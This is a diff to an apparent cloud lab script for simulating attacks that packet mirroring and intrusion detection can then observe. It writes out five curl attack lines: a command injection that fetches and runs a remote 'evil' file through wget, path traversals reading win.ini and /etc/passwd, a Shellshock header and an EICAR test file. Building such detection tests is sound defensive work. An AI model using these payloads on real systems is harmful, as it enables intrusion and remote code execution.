@@ -172,15 +172,19 @@ gcloud compute packet-mirrorings list
 # --------------------------------
 # Simulate attack
 # --------------------------------
-gcloud compute ssh $ATTACKER_VM_NAME \
-  --zone $ZONE \
-  --tunnel-through-iap \
-  --command bash -s $(
-    cat <<EOF
+cat >attack.sh <<'EOF'
 curl "http://192.168.10.20/weblogin.cgi?username=admin';cd /tmp;wget http://123.123.123.123/evil;sh evil;rm evil"
 curl http://192.168.10.20/?item=../../../../WINNT/win.ini
 curl http://192.168.10.20/eicar.file
 curl http://192.168.10.20/cgi-bin/../../../..//bin/cat%20/etc/passwd
 curl -H 'User-Agent: () { :; }; 123.123.123.123:9999' http://192.168.10.20/cgi-bin/test-critical
 EOF
-  )
+chmod +x attack.sh
+gcloud compute scp attack.sh $ATTACKER_VM_NAME:~/ \
+  --zone $ZONE \
+  --tunnel-through-iap
+
+gcloud compute ssh $ATTACKER_VM_NAME \
+  --zone $ZONE \
+  --tunnel-through-iap \
+  --command bash attack.sh
